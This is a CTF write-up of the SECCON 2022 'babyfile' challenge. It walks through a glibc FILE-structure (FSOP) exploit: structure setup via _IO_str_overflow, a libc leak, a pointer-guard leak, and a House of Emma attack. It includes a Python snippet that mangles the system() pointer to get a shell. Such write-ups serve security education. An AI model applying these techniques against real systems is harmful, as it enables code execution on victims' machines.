# SECCON CTF 2022
## babyfile by *thesage- && Synerr*


### TL; DR 
* Initialize structure with `_IO_str_overflow`
* Leak libc with `_IO_new_file_sync`
* Leak canary 
* Perform House_of_Emma attack

### Task overview
This task was presented by **shift-crops** and is a pretty classic FSOP-based CTF task.
Checksec show us that this binary is loaded with all kinds of mitigations.![Checksec output](/pwn/babyfile/assets/checksec.png)
We are given the source code, so without further ado let's dive into
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
	FILE *fp;

	alarm(30);

	write_str("Play with FILE structure\n");

	if(!(fp = fopen("/dev/null", "r"))){
		write_str("Open error");
		return -1;
	}
	fp->_wide_data = NULL;

	for(;;){
		switch(menu()){
			case 0:
				goto END;
			case 1:
				fflush(fp);
				break;
			case 2:
				{
					unsigned char ofs;
					write_str("offset: ");
					if((ofs = getint()) & 0x80)
						ofs |= 0x40;
					write_str("value: ");
					((char*)fp)[ofs] = getint();
				}
				break;
		}
		write_str("Done.\n");
	}

END:
	write_str("Bye!");
	_exit(0);
}

static int menu(void){
	write_str("\nMENU\n"
			"1. Flush\n"
			"2. Trick\n"
			"0. Exit\n"
			"> ");

	return getint();
}

static int getnline(char *buf, int size){
	int len;

	if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
		return -1;

	if(buf[len-1]=='\n')
		len--;
	buf[len] = '\0';

	return len;
}

static int getint(void){
	char buf[0x10] = {};

	getnline(buf, sizeof(buf));
	return atoi(buf);
}
```
What we can do is basically trigger `fflush` function or rewrite any byte at (almost) any offset from our `FILE` structure. Here is the layout of it in case you forgot how it looks. I've commented out fields that we cannot overwrite due to the task's limitations.

```c
/* offset      |    size */    type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    //signed char _vtable_offset;
/*    131      |       1 */    //char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    //_IO_lock_t *_lock;
/*    144      |       8 */    //__off64_t _offset;
/*    152      |       8 */    //struct _IO_codecvt *_codecvt;
/*    160      |       8 */    //struct _IO_wide_data *_wide_data;
/*    168      |       8 */    //struct _IO_FILE *_freeres_list;
/*    176      |       8 */    //void *_freeres_buf;
/*    184      |       8 */    //size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];
/*    216      |       8 */    const struct _IO_jump_t *vtable;
/* total size (bytes):  224 */
```
Since `fflush` is the only function we can trigger, let's look at it's source code.

```c
int
_IO_fflush (FILE *fp)
{
    ...
      result = _IO_SYNC (fp) ? EOF : 0;
    ...
}
```

`_IO_SYNC` is a macro that triggers `__sync` field in the vtable of our `FILE` struture.
> _IO_file_jumps
```c
$3 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x7ffff7e64f50 <_IO_new_file_finish>,
  __overflow = 0x7ffff7e65d80 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7e65a20 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7e66f50 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7e68680 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7e645d0 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7e64240 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7e63860 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7e67600 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7e63530 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7e633c0 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7e56c70 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7e645a0 <__GI__IO_file_read>,
  __write = 0x7ffff7e63e60 <_IO_new_file_write>,
  __seek = 0x7ffff7e63600 <__GI__IO_file_seek>,
  __close = 0x7ffff7e63520 <__GI__IO_file_close>,
  __stat = 0x7ffff7e63e40 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7e68810 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7e68820 <_IO_default_imbue>
}
```

### Initializing our structure

So, considering the fact we can overwrite `vtable` filed in our `FILE` structure, we can start to think of the ways to gain RCE. First things first, we need to get information leak, because we don't know neither binary's base, nor libc's. Here we're bumping into our first obstacle: our `FILE` structure is completely empty.

> GDB view of our structure

```p
$1 = {
  file = {
    _flags = -72539000,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7fc25c0 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x55555555a380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x55555555a390,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7fbe4a0 <_IO_file_jumps>
}
```
We'll use `_IO_str_overflow`, which initializes all of the `_IO_read...` and `_IO_write...` ptrs in out structure to fix this. You'll have to take my word for it, cause it'd take to much time to walk you through this. However it gets even trickier, because we can't determine one nible, set by ASLR (`0x?518`), so our final exploit will have `1/16` chance of success.

After overwriting `vtable` of our `FILE` structre so that `fflush` would call `_IO_str_overflow` instead of `_IO_new_file_sync` we get
```
$3 = {
  file = {
    _flags = 0,
    _IO_read_ptr = 0x5647136dd480 "x",
    _IO_read_end = 0x5647136dd481 "",
    _IO_read_base = 0x5647136dd480 "x",
    _IO_write_base = 0x5647136dd480 "x",
    _IO_write_ptr = 0x5647136dd481 "",
    _IO_write_end = 0x5647136dd4e4 "",
    _IO_buf_base = 0x5647136dd480 "x",
    _IO_buf_end = 0x5647136dd4e4 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7f898ae9d5c0 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x5647136dd380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f898ae90518 <_IO_file_jumps+120>
}
```
### Getting libc leak

Our structure now has some data inside of it, so let's take a look at what usefull things might be laying around that heap area.

```
pwndbg> x/4xg 0x5647136dd470
0x5647136dd470: 0x00007f898ae98f60      0x0000000000000071
0x5647136dd480: 0x0000000000000078      0x0000000000000000
```
We almost immediately find an address from libc area (`-0x10` bytes from `_IO_read_ptr`), which is great, but now we need to find a way to leak it.

After a couple minutes of scrolling through libc source code, we finally come across the part of the `_IO_new_file_sync` where [it calls](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L798) `_IO_do_flush`, a macro, which in turn calls `_IO_do_write` from `_IO_write_base` to `_IO_write_ptr`.

    #define _IO_do_flush(_f) \
      ((_f)->_mode <= 0							      \
       ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
    		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
       : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
    		   ((_f)->_wide_data->_IO_write_ptr			      \
    		    - (_f)->_wide_data->_IO_write_base)))

We modify LSB of `_IO_write_base` to be `0x70` and get the libc leak, quickly computing the address of a `system()` and `/bin/sh` string. Now we are almost ready to perform final step of our exploit, however we're gonna need one more piece to complete the puzzle.

### Leaking canary
To get RCE we'll use `_IO_cookie_write`, in which the function pointer gets *demangled* before called, so we're gonna need to leak the secret canary (Sranary) first.
The technique here will exactly the same as the one we used to leak the libc address, however during the CTF something strange occured and insted of leaking sranary we got 0x0. After some 10-thread python bruteforcing we found that sever's sranary is actually `-0x80` bytes from supposed location. I genuinely have no idea why, but we took what we got and prepared ourselves for the final step.

```
Libc leak:  0x7f599c3fff60
Libc based:  0x7f599c217000
Canary addr:  0x7f599c40a5f0
System addr:  0x7f599c269290
Sranary: 0x8031e46a678508af
```
### Getting the shell

This step is a classic example of House of Emma attack (you can read more about it [here](https://www.anquanke.com/post/id/260614)). In short we'll be using `_IO_cookie_write` funtion which casts data at offset of `0xf0` from our `FILE` structure to a function pointer, *demangles* it and calls with data at offset of `0xe0` as argument. [See for yourself](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iofopncook.c#L48)

So, we rewrite using given us primitive data at offset of `0xf0` with such value, that when demangled transformed into a pointer to the `system` function.
```python
unxor_system = system_addr ^ sranary

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

unror_system = rol(unxor_system, 0x11, 64)
```
Next, we overwrite `vtable` so that `_IO_cookie_write` is called instead of `_IO_new_file_sync`, and finally put address of `/bin/sh` strings at `0xe0` offset.
Trigger `fflush` and there you have it
`SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}`
